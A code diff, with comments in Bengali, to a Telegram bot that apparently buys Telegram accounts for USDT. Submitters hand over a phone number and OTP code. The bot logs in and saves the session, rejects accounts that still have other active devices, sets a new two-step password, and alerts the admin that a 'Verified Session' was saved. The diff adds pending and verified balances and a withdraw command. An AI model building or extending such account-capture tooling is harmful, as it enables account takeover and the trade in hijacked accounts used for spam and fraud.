@@ -3,6 +3,7 @@ import asyncio
 import json
 import shutil
 import zipfile
+import sys
 from datetime import datetime
 from threading import Thread
 from flask import Flask, render_template_string
@@ -71,18 +72,45 @@ def get_user_stats(user_id):
     db = load_db()
     uid = str(user_id)
     if uid not in db:
-        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
+        # ফ্রোজেন বাদ দিয়ে আপনার নতুন রিকোয়ারমেন্ট অনুযায়ী স্ট্রাকচার পরিবর্তন
+        db[uid] = {
+            "verified": 0, 
+            "unverified": 0, 
+            "pending_balance": 0.0, 
+            "verified_balance": 0.0
+        }
         save_db(db)
+    else:
+        # ওল্ড ডাটাবেস মাইগ্রেশন সেফটি চেক
+        if "pending_balance" not in db[uid]: db[uid]["pending_balance"] = 0.0
+        if "verified_balance" not in db[uid]: db[uid]["verified_balance"] = db[uid].get("balance", 0.0)
     return db[uid]
 
-def add_user_account_success(user_id, amount):
+def add_user_pending_account(user_id, amount):
     db = load_db()
     uid = str(user_id)
-    if uid not in db:
-        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
-    db[uid]["verified"] += 1
-    db[uid]["balance"] = round(db[uid]["balance"] + amount, 2)
+    if uid not in db: get_user_stats(user_id); db = load_db()
+    db[uid]["unverified"] += 1
+    db[uid]["pending_balance"] = round(db[uid]["pending_balance"] + amount, 2)
     save_db(db)
+
+def convert_pending_to_verified(user_id, amount):
+    db = load_db()
+    uid = str(user_id)
+    if uid in db:
+        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
+        db[uid]["verified"] += 1
+        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
+        db[uid]["verified_balance"] = round(db[uid]["verified_balance"] + amount, 2)
+        save_db(db)
+
+def reject_pending_account(user_id, amount):
+    db = load_db()
+    uid = str(user_id)
+    if uid in db:
+        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
+        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
+        save_db(db)
 
 def get_current_file_count(country_code):
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
@@ -110,9 +138,12 @@ def home():
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+    try:
+        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+    except Exception as e:
+        print(f"Flask Web Server Error: {e}", file=sys.stderr)
 
-# অ্যাসিনক্রোনাস কাজের জন্য গ্লোবাল ইভেন্ট লুপ তৈরি
+# অ্যাসিনক্রোনাস কাজের জন্য থ্রেড সেফ ইভেন্ট লুপ
 bot_loop = asyncio.new_event_loop()
 def start_async_loop(loop):
     asyncio.set_event_loop(loop)
@@ -162,19 +193,27 @@ def process_account(message):
     current_time = datetime.now().strftime("%m/%d/%y")
     current_clock = datetime.now().strftime("%H:%M:%S")
     
+    # আপনার স্ক্রিনশট ও নতুন চাহিদা অনুযায়ী সাজানো অ্যাকাউন্ট সেকশন
     response = (
         f"👤 **ID : {user_id}**\n\n"
         f"✅ Number of verified accounts : {stats['verified']}\n"
         f"⏳ Number of unverified accounts : {stats['unverified']}\n"
-        f"🅈 Available Balance IN USDT : {stats['balance']:.2f}\n"
-        f"🛢 Number of frozen account : {stats['frozen_count']}\n"
-        f"🧊 Total Frozen Balance : {stats['frozen_balance']:.2f}\n\n"
+        f"🅈 Total Verified Balance : {stats['verified_balance']:.2f} USDT\n"
+        f"⏳ Total Pending Balance : {stats['pending_balance']:.2f} USDT\n\n"
         f"📅 Date : {current_time}\n"
         f"🕐 Time : {current_clock} ( NZ Time )\n\n"
-        f"✍️ *Note : You Can Also Check Your Withdraw History Using This Command*\n\n"
-        f"/withdrawhistory"
+        f"✍️ *Note : You Can Only Withdraw Your Verified Balance.*\n\n"
+        f"/withdraw"
     )
     bot.send_message(message.chat.id, response)
+
+def process_withdraw(message):
+    user_id = message.from_user.id
+    stats = get_user_stats(user_id)
+    if stats['verified'] < 5 or stats['verified_balance'] <= 0.0:
+        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal is at least 5 verified account(s) and valid verified balance.**")
+    else:
+        bot.send_message(message.chat.id, f"✅ Your withdrawal request for **{stats['verified_balance']:.2f} USDT** has been submitted to the admin.")
 
 @bot.message_handler(commands=['start'])
 def cmd_start(message): process_start(message)
@@ -187,6 +226,9 @@ def cmd_capacity(message): process_capacity(message)
 
 @bot.message_handler(commands=['account'])
 def cmd_account(message): process_account(message)
+
+@bot.message_handler(commands=['withdraw'])
+def cmd_withdraw(message): process_withdraw(message)
 
 # ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
 @bot.message_handler(commands=['panel'])
@@ -290,8 +332,9 @@ def handle_text(message):
     elif "cancel" in low_text or "/cancel" in low_text: process_cancel(message); return
     elif "capacity" in low_text or "/capacity" in low_text: process_capacity(message); return
     elif "account" in low_text or "/account" in low_text: process_account(message); return
+    elif "withdraw" in low_text or "/withdraw" in low_text: process_withdraw(message); return
 
-    # ওটিপি কোড হ্যান্ডলিং
+    # ওটিপি কোড হ্যান্ডলিং (আগে যাতে নম্বরে ফিল্টার না হয়)
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
         asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
         return
@@ -310,7 +353,7 @@ def handle_text(message):
     else:
         bot.reply_to(message, "❌ Invalid Command or Phone Number format. Use /start to reset.")
 
-# ==================== ওটিপি ও সেশন কোর ব্যাকএন্ড (রানিং ইন বোতল লুপ) ====================
+# ==================== ওটিপি ও সেশন কোর ব্যাকএন্ড ====================
 async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
     settings = load_settings()
     max_capacity = settings["country_capacity"].get(country_code, 9999)
@@ -374,6 +417,9 @@ async def process_security_and_backup(user_id, message, data, current_client):
     delay = country_delays.get(data['country_code'], 600)
     price = settings["country_prices"].get(data['country_code'], 0.24)
     
+    # ওটিপি সফল হওয়ার পর সাথে সাথে পেন্ডিং ব্যালেন্স অ্যাড হবে
+    add_user_pending_account(user_id, price)
+    
     success_text = (
         f"✅ The account number `{data['phone']}` was successfully received\n\n"
         f"❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n"
@@ -385,14 +431,24 @@ async def process_security_and_backup(user_id, message, data, current_client):
     markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
     bot.reply_to(message, success_text, reply_markup=markup)
     
+    # কাউন্টডাউন শুরু (ব্যাকগ্রাউন্ডে)
     await asyncio.sleep(delay)
     try:
+        await current_client.connect()
         auths = await current_client(functions.account.GetAuthorizationsRequest())
+        
+        # [মাল্টি ডিভাইস ফিল্টার] যদি অন্য ডিভাইস একটিভ থাকে
         if len([a for a in auths.authorizations if not a.current]) > 0:
-            bot.send_message(message.chat.id, f"❌ **Verification Failed!** Other active devices detected on `{data['phone']}`.")
+            bot.send_message(message.chat.id, f"❌ **Verification Failed!** Other active devices detected on `{data['phone']}`. Account rejected.")
+            reject_pending_account(user_id, price) # পেন্ডিং থেকে রিজেক্ট
             await current_client.disconnect()
+            try:
+                for ext in [".session", ".session-journal"]:
+                    os.remove(data["session_path"] + ext)
+            except: pass
             return False
             
+        # যদি অন্য কোনো ডিভাইস না থাকে, তবে ২এফএ পাসওয়ার্ড সেট করবে
         try:
             await current_client(functions.account.UpdatePasswordSettingsRequest(
                 password=tl_types.InputCheckPasswordEmpty(),
@@ -401,13 +457,15 @@ async def process_security_and_backup(user_id, message, data, current_client):
         except: pass
         
         await current_client.disconnect()
-        add_user_account_success(user_id, price)
+        
+        # সফলভাবে পেন্ডিং থেকে ভেরিফাইড ব্যালেন্সে ট্রান্সফার
+        convert_pending_to_verified(user_id, price)
+        bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
         bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
     except Exception as e:
-        pass
+        reject_pending_account(user_id, price)
 
 if __name__ == "__main__":
-    # Flask সার্ভার ব্যাকগ্রাউন্ড থ্রেডে স্টার্ট করা (Render-এর জন্য পোর্ট ৮MD ওপেন রাখা)
+    # Flask রেন্ডারের সেফটির জন্য সেপারেট ব্যাকগ্রাউন্ড থ্রেডে রান করা
     Thread(target=run_web, daemon=True).start()
-    # টেলিগ্রাম পোলিং স্টার্ট করা মেইন থ্রেডে
     bot.infinity_polling(skip_pending=True)
